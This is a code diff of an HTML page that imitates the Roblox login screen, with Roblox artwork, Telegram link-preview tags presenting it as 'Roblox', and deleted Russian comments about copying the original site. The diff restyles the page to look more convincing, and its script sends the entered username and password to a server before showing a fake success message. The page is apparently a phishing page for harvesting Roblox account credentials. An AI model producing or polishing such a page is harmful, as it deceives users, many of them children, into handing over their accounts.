@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Roblox</title>
+    <title>Roblox Login</title>
 
     <!-- Telegram Preview Meta Tags -->
     <meta property="og:site_name" content="Roblox">
@@ -21,209 +21,250 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
         body {
-            background-color: #f2f4f5;
-            color: #111;
+            background-color: #0d0f12;
+            color: #fff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            justify-content: flex-start;
             position: relative;
+            overflow-x: hidden;
             padding: 20px 16px;
         }
-
-        /* Фоновый паттерн / легкое затемнение под оригинальный сайт */
+        
+        /* Background dimming */
         body::before {
             content: "";
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.6)),
-                        url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png');
+            background: rgba(13, 15, 18, 0.85);
+            z-index: -2;
+        }
+
+        /* Background game collage tiles */
+        .bg-collage {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            opacity: 0.45;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .bg-tile {
+            position: absolute;
             background-size: cover;
             background-position: center;
-            z-index: -1;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
+        .tile-1 { width: 170px; height: 110px; top: 2%; left: -5%; transform: rotate(-8deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
+        .tile-2 { width: 160px; height: 100px; top: 5%; right: -8%; transform: rotate(12deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
+        .tile-3 { width: 180px; height: 115px; bottom: 15%; left: -8%; transform: rotate(6deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
+        .tile-4 { width: 190px; height: 120px; bottom: 8%; right: -10%; transform: rotate(-10deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
+
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+            z-index: 10;
         }
 
-        /* Центральная белая карточка как на оригинальном сайте Roblox */
-        .login-card {
-            background: #ffffff;
-            color: #111;
+        .container {
             width: 100%;
             max-width: 400px;
-            padding: 32px 28px;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
-            text-align: center;
-        }
-
-        .login-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #111;
-            margin-bottom: 24px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-            text-align: left;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #393b3d;
-            margin-bottom: 6px;
-        }
-
-        .input-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
             position: relative;
-            width: 100%;
+            z-index: 10;
         }
 
-        .input-wrapper input {
+        .roblox-logo-text {
+            font-size: 42px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            color: #fff;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+
+        .input-box {
             width: 100%;
-            padding: 12px 40px 12px 14px;
-            background: #fff;
-            border: 1px solid #757575;
-            border-radius: 8px;
-            font-size: 15px;
-            color: #111;
+            background: rgba(30, 33, 42, 0.85);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            margin-bottom: 14px;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 16px 45px 16px 16px;
+            background: transparent;
+            border: none;
             outline: none;
-            transition: border-color 0.2s;
+            color: #fff;
+            font-size: 14px;
         }
 
-        .input-wrapper input:focus {
-            border-color: #0074e8;
-            box-shadow: 0 0 0 1px #0074e8;
+        .input-box input::placeholder {
+            color: #9ca3af;
         }
 
-        .input-wrapper input::placeholder {
-            color: #b2b2b2;
-        }
-
-        .eye-icon {
+        /* Working eye button */
+        .eye-btn {
             position: absolute;
             right: 14px;
             top: 50%;
             transform: translateY(-50%);
+            background: none;
+            border: none;
             cursor: pointer;
             font-size: 18px;
-            color: #757575;
-            user-select: none;
+            padding: 4px;
+            color: #9ca3af;
+        }
+        .eye-btn:hover {
+            color: #fff;
         }
 
-        /* Фирменная синяя кнопка входа Roblox */
+        /* Login button (active when fields are filled) */
         .login-btn {
             width: 100%;
-            padding: 14px;
-            background: #0074e8;
-            color: #fff;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.15);
+            color: #9ca3af;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 8px;
-            margin-bottom: 16px;
-            transition: background 0.2s;
+            margin-top: 6px;
+            margin-bottom: 14px;
+            transition: 0.2s;
         }
 
-        .login-btn:hover {
-            background: #005bb5;
+        .login-btn.active {
+            background: #fff;
+            color: #000;
         }
 
-        .forgot-container {
-            margin-top: 12px;
+        .quick-btn {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .quick-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
         }
 
         .forgot-link {
-            color: #0074e8;
-            font-size: 14px;
+            color: #9ca3af;
+            font-size: 13px;
             text-decoration: none;
-            font-weight: 600;
+            margin-bottom: 40px;
+            text-align: center;
         }
-
         .forgot-link:hover {
             text-decoration: underline;
         }
 
-        .divider {
-            border: 0;
-            height: 1px;
-            background: #e0e0e0;
-            margin: 20px 0;
-        }
-
-        .other-options-btn {
-            width: 100%;
-            padding: 12px;
-            background: #f2f2f2;
-            color: #393b3d;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            justify-content: center;
             font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 10px;
+            margin-top: auto;
+            padding-bottom: 20px;
         }
 
-        .other-options-btn:hover {
-            background: #e6e6e6;
+        .footer-links a {
+            color: #60a5fa;
+            text-decoration: underline;
         }
 
         #status {
-            margin-top: 12px;
+            margin-top: 10px;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 500;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <h1 class="login-title">Login to Roblox</h1>
+    <div class="close-btn">✕</div>
 
-        <div class="input-group">
-            <label class="input-label">Username/Email/Phone</label>
-            <div class="input-wrapper">
-                <input type="text" id="usernameInput" placeholder="Username/Email/Phone">
-            </div>
+    <div class="bg-collage">
+        <div class="bg-tile tile-1"></div>
+        <div class="bg-tile tile-2"></div>
+        <div class="bg-tile tile-3"></div>
+        <div class="bg-tile tile-4"></div>
+    </div>
+
+    <div class="container">
+        <div class="roblox-logo-text">ROBLOX</div>
+
+        <div class="input-box">
+            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
         </div>
 
-        <div class="input-group">
-            <label class="input-label">Password</label>
-            <div class="input-wrapper">
-                <input type="password" id="passwordInput" placeholder="Password">
-                <span class="eye-icon" id="eyeToggle" onclick="togglePassword()">👁️</span>
-            </div>
+        <div class="input-box">
+            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
+            <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">👁️</button>
         </div>
 
-        <button class="login-btn" onclick="loginUser()">Log In</button>
+        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
         
-        <div class="forgot-container">
-            <a href="#" class="forgot-link">Forgot Password or Username?</a>
-        </div>
+        <button class="quick-btn">Quick Pass</button>
 
-        <hr class="divider">
-
-        <button class="other-options-btn">Email Me a One-Time Code</button>
-        <button class="other-options-btn">Quick Pass</button>
+        <a href="#" class="forgot-link">Forgot Password or Username</a>
 
         <div id="status"></div>
     </div>
 
+    <div class="footer-links">
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+    </div>
+
     <script>
+        function checkInputs() {
+            const user = document.getElementById('usernameInput').value.trim();
+            const pass = document.getElementById('passwordInput').value.trim();
+            const btn = document.getElementById('loginBtn');
+            if (user && pass) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
         function togglePassword() {
             const passwordInput = document.getElementById('passwordInput');
             const eyeToggle = document.getElementById('eyeToggle');
             
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
-                eyeToggle.style.opacity = '1';
+                eyeToggle.style.opacity = '0.5';
             } else {
                 passwordInput.type = 'password';
-                eyeToggle.style.opacity = '0.6';
+                eyeToggle.style.opacity = '1';
             }
         }
 
@@ -233,12 +274,12 @@
             const statusDiv = document.getElementById('status');
 
             if (!username || !password) {
-                statusDiv.style.color = '#d9381e';
+                statusDiv.style.color = '#ef4444';
                 statusDiv.innerText = 'Please fill in all fields.';
                 return;
             }
 
-            statusDiv.style.color = '#757575';
+            statusDiv.style.color = '#9ca3af';
             statusDiv.innerText = 'Logging in...';
 
             try {
@@ -251,7 +292,7 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    statusDiv.style.color = '#008000';
+                    statusDiv.style.color = '#22c55e';
                     statusDiv.innerText = 'Success! Redirecting...';
                     
                     setTimeout(() => {
@@ -259,11 +300,11 @@
                     }, 1500);
 
                 } else {
-                    statusDiv.style.color = '#d9381e';
+                    statusDiv.style.color = '#ef4444';
                     statusDiv.innerText = data.error || 'Login failed';
                 }
             } catch (err) {
-                statusDiv.style.color = '#d9381e';
+                statusDiv.style.color = '#ef4444';
                 statusDiv.innerText = 'Connection error.';
             }
         }
